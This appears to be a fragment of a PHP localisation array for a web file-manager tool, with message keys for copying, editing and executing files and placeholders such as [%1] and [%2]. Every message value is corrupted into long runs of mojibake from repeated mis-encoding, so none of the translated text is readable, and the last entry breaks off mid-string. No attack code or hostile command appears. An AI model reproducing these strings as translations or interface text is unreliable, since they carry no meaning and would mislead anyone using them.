'copy_files' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â«Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½:',
'copied' => "Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â³Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ \"[%2]\" :\n[%1]",
'not_copied' => "Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â³Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ \"[%2]\" :\n[%1]",
'not_edited' => '"[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½.',
'executed' => "\"[%1]\" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½:\n{%2}",
'not_executed' => "\"[%1]\" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ 